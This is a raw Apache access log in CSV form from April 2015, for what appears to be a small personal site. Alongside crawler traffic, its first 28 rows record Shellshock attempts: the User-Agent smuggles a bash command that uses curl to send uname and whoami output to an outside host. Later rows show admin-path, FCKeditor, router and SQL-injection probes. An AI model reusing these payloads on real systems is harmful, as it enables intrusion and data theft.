"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"180.234.44.185","-","2015-04-12 19:38:09","GMT-0700","GET","/cgi-bin/adminwww.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:11","GMT-0700","GET","/cgi-bin/admin/setup.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:11","GMT-0700","GET","/cgi-bin/admin/admin.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:13","GMT-0700","GET","/cgi-bin/admin.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:14","GMT-0700","GET","/cgi-bin/adduser.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:15","GMT-0700","GET","/cgi-bin/addbanner.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:15","GMT-0700","GET","/cgi-bin/add_ftp.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:16","GMT-0700","GET","/cgi-bin/a1stats/a1disp4.cgi",404,549,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:17","GMT-0700","GET","/cgi-bin/a1stats/a1disp3.cgi",404,549,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:18","GMT-0700","GET","/cgi-bin/a1disp3.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:18","GMT-0700","GET","/cgi-bin/14all.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:21","GMT-0700","GET","/cgi-bin/.namazu.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:21","GMT-0700","GET","/cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi",404,565,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:22","GMT-0700","GET","/cgi-bin/.cobalt/message/message.cgi",404,557,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:23","GMT-0700","GET","/cgi-bin/.cobalt/alert/service.cgi",404,555,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:26","GMT-0700","GET","/catalog/index.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:27","GMT-0700","GET","/cartcart.cgi",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:27","GMT-0700","GET","/ccbill/whereami.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:27","GMT-0700","GET","/cart.cgi",404,530,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:28","GMT-0700","GET","/bigconf.cgi",404,533,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:30","GMT-0700","GET","/bandwidth/index.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:33","GMT-0700","GET","/apps/web/vs_diag.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:34","GMT-0700","GET","/analyse.cgi",404,533,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:34","GMT-0700","GET","/aktivate/cgi-bin/catgy.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:35","GMT-0700","GET","/agora.cgi",404,531,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:36","GMT-0700","GET","/administrator.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:37","GMT-0700","GET","/admin.cgi",404,531,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:38","GMT-0700","GET","/_mt/mt.cgi",404,532,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"213.133.97.216","-","2015-04-12 19:47:21","GMT-0700","HEAD","/",200,279,"-","Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0"
"66.249.67.63","-","2015-04-12 19:48:22","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"95.215.9.222","-","2015-04-12 19:55:20","GMT-0700","GET","/",200,562,"-","netscan.lekus.su"
"58.22.73.116","-","2015-04-12 20:20:55","GMT-0700","GET","/ramble/index.php?blogid=28",404,495,"http://spinster.org/ramble/index.php?blogid=28","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
"106.120.173.111","-","2015-04-12 20:28:58","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"106.120.173.111","-","2015-04-12 20:28:58","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"208.115.113.92","-","2015-04-12 21:13:23","GMT-0700","GET","/",200,543,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"137.175.211.125","-","2015-04-12 21:24:14","GMT-0700","GET","/tmUnblock.cgi",400,514,"-","-"
"137.175.211.125","-","2015-04-12 21:24:15","GMT-0700","GET","/",400,514,"-","-"
"198.204.241.202","-","2015-04-12 21:36:18","GMT-0700","GET","/ramble/index.php?blogId=57",404,495,"http://spinster.org/ramble/index.php?blogId=57","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 YaBrowser/14.10.2062.12061 Safari/537.36"
"198.204.241.202","-","2015-04-12 21:36:19","GMT-0700","GET","/",200,562,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 YaBrowser/14.10.2062.12061 Safari/537.36"
"109.166.213.12","-","2015-04-12 22:26:15","GMT-0700","GET","/wp-login.php",404,505,"-","Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11"
"109.166.213.12","-","2015-04-12 22:26:15","GMT-0700","GET","/administrator/",404,504,"-","Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11"
"109.166.213.12","-","2015-04-12 22:26:16","GMT-0700","GET","/admin.php",404,501,"-","Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11"
"157.55.39.72","-","2015-04-12 23:21:31","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"128.61.240.66","-","2015-04-13 00:02:04","GMT-0700","GET","/",200,562,"-","netscan.gtisc.gatech.edu"
"141.212.122.66","-","2015-04-13 00:10:11","GMT-0700","GET","/",200,543,"-","-"
"216.238.246.73","-","2015-04-13 00:23:53","GMT-0700","GET","/",400,514,"-","-"
"46.4.12.20","-","2015-04-13 00:34:24","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"136.243.5.219","-","2015-04-13 00:51:00","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"121.41.111.107","-","2015-04-13 01:34:44","GMT-0700","GET","/cgi-sys/entropysearch.cgi",404,546,"-","the beast"
"94.131.14.7","-","2015-04-13 05:49:19","GMT-0700","GET","/blog/wp-login.php",404,456,"-","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1"
"94.131.14.7","-","2015-04-13 05:49:19","GMT-0700","GET","/blog/robots.txt",404,454,"-","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1"
"94.131.14.7","-","2015-04-13 05:49:19","GMT-0700","GET","/blog/admin/login.php",404,456,"-","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11"
"94.131.14.7","-","2015-04-13 05:49:19","GMT-0700","GET","/blog/login.php?do=login",404,453,"-","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/11.0.660.0 Safari/534.18"
"94.131.14.7","-","2015-04-13 05:49:19","GMT-0700","GET","/blog/administrator/index.php",404,462,"-","Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24"
"94.131.14.7","-","2015-04-13 05:49:19","GMT-0700","GET","/blog/",404,447,"-","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.25 (KHTML, like Gecko) Chrome/12.0.706.0 Safari/534.25"
"94.131.14.7","-","2015-04-13 05:49:19","GMT-0700","GET","/blog/typo3/index.php",404,458,"-","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
"94.131.14.7","-","2015-04-13 05:49:19","GMT-0700","GET","/blog/manager",404,452,"-","Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.60 Safari/534.30"
"94.131.14.7","-","2015-04-13 05:49:20","GMT-0700","GET","/blog/index.php?action=admin",404,454,"-","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
"127.0.0.1","-","2015-04-13 05:49:34","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-04-13 05:49:35","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-04-13 05:49:36","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-04-13 05:49:37","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"203.133.169.208","-","2015-04-13 05:51:46","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; MSIE or Firefox mutant; not on Windows server;) Daumoa/4.0"
"188.143.232.72","-","2015-04-13 06:11:15","GMT-0700","GET","/ramble/index.php?blogId=21",404,495,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
"136.243.5.87","-","2015-04-13 06:47:01","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"104.154.72.88","-","2015-04-13 06:54:48","GMT-0700","GET","/",200,600,"-","NerdyBot"
"123.30.175.212","-","2015-04-13 07:09:02","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
"66.249.79.110","-","2015-04-13 07:39:22","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"204.29.111.2","-","2015-04-13 07:57:10","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
"204.29.111.2","-","2015-04-13 07:57:10","GMT-0700","GET","/hamster.gif",200,700105,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
"204.29.111.2","-","2015-04-13 07:57:13","GMT-0700","GET","/favicon.ico",404,504,"-","Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko"
"204.29.111.2","-","2015-04-13 08:00:04","GMT-0700","GET","/",200,565,"http://www.google.com/url?sa=f&rct=j&url=http://spinster.org/&q=spinster.org&ei=YeArVcymNou_ggT60oPIAw&usg=AFQjCNF8Zo7HgaDvk7j4zjDeitvgl7LwEg","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36"
"204.29.111.2","-","2015-04-13 08:00:04","GMT-0700","GET","/hamster.gif",200,700105,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36"
"204.29.111.2","-","2015-04-13 08:00:06","GMT-0700","GET","/favicon.ico",404,503,"-","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36"
"77.75.79.32","-","2015-04-13 08:09:21","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)"
"77.75.79.32","-","2015-04-13 08:09:32","GMT-0700","GET","/",304,212,"-","Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)"
"175.42.83.21","-","2015-04-13 08:40:05","GMT-0700","GET","/webmanage/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp",404,562,"http://spinster.org/webmanage/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
"175.42.83.21","-","2015-04-13 08:40:06","GMT-0700","GET","/editor/editor/filemanager/browser/default/connectors/asp/connector.asp",404,549,"http://spinster.org/editor/editor/filemanager/browser/default/connectors/asp/connector.asp","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
"175.42.83.21","-","2015-04-13 08:40:07","GMT-0700","GET","/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp",404,552,"http://spinster.org/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
"175.42.83.21","-","2015-04-13 08:40:08","GMT-0700","GET","/admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp",404,558,"http://spinster.org/admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
"175.42.83.21","-","2015-04-13 08:40:11","GMT-0700","GET","/editor/filemanager/browser/default/connectors/asp/connector.asp",404,542,"http://spinster.org/editor/filemanager/browser/default/connectors/asp/connector.asp","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
"175.42.83.21","-","2015-04-13 08:40:15","GMT-0700","GET","/manage/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp",404,559,"http://spinster.org/manage/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
"119.63.196.25","-","2015-04-13 08:52:51","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
"101.226.167.235","-","2015-04-13 09:01:58","GMT-0700","GET","/robots.txt",200,423,"http://spinster.org/robots.txt","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; HaosouSpider; http://www.haosou.com/help/help_3_2.html)"
"162.210.196.130","-","2015-04-13 09:14:46","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"94.131.14.7","-","2015-04-13 09:27:56","GMT-0700","GET","/blog/robots.txt",404,450,"-","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/10.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11"
"94.131.14.7","-","2015-04-13 09:27:56","GMT-0700","GET","/blog/",404,443,"-","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15"
"94.131.14.7","-","2015-04-13 09:27:57","GMT-0700","GET","/blog/wp-login.php",404,450,"-","Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"
"94.131.14.7","-","2015-04-13 09:27:57","GMT-0700","GET","/blog/manager",404,448,"-","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.790.0 Safari/535.1"
"94.131.14.7","-","2015-04-13 09:27:57","GMT-0700","GET","/blog/typo3/index.php",404,453,"-","Mozilla/5.0 (Macintosh; PPC Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.790.0 Safari/535.1"
"94.131.14.7","-","2015-04-13 09:27:57","GMT-0700","GET","/blog/administrator/index.php",404,457,"-","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24"
"94.131.14.7","-","2015-04-13 09:27:57","GMT-0700","GET","/blog/index.php?action=admin",404,449,"-","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30"
"94.131.14.7","-","2015-04-13 09:27:57","GMT-0700","GET","/blog/admin/login.php",404,452,"-","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24"
"94.131.14.7","-","2015-04-13 09:27:57","GMT-0700","GET","/blog/login.php?do=login",404,448,"-","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
"127.0.0.1","-","2015-04-13 09:28:14","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-04-13 09:28:15","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-04-13 09:28:16","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"127.0.0.1","-","2015-04-13 09:28:17","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"14.207.191.55","-","2015-04-13 11:41:22","GMT-0700","GET","/ramble/index.php?blogId=12",404,507,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36"
"14.207.191.55","-","2015-04-13 11:41:22","GMT-0700","GET","/",200,564,"http://spinster.org","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36"
"104.192.0.18","-","2015-04-13 12:11:01","GMT-0700","GET","/HNAP1",404,486,"-","-"
"114.221.62.150","-","2015-04-13 12:15:56","GMT-0700","GET","/ramble/index.php?blogId=39",404,533,"-","Mozilla/4.0   (compatible;   MSIE   7.0;   Windows   NT   5.1;   SV1;   Maxthon;   .NET   CLR   2.0.50727;   .NET   CLR   3.0.04506.30)"
"173.192.34.95","-","2015-04-13 13:53:14","GMT-0700","GET","/robots.txt",200,396,"-","Aboundex/0.3 (http://www.aboundex.com/crawler/)"
"173.192.34.95","-","2015-04-13 13:53:14","GMT-0700","GET","/",200,599,"-","Aboundex/0.3 (http://www.aboundex.com/crawler/)"
"91.214.70.206","-","2015-04-13 14:13:59","GMT-0700","GET","/ramble/index.php?blogId=5'A=0",404,507,"http://spinster.org/ramble/index.php?blogId=5'A=0","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko)"
"203.133.171.20","-","2015-04-13 15:46:41","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; MSIE or Firefox mutant; not on Windows server;) Daumoa/4.0"
"66.249.79.55","-","2015-04-13 19:29:07","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"52.4.87.63","-","2015-04-13 20:01:59","GMT-0700","GET","/",200,600,"-","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0"
"178.18.124.44","-","2015-04-13 21:02:48","GMT-0700","GET","/",200,600,"-","Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US)"
"61.240.144.67","-","2015-04-13 21:11:39","GMT-0700","GET","/",200,562,"-","masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
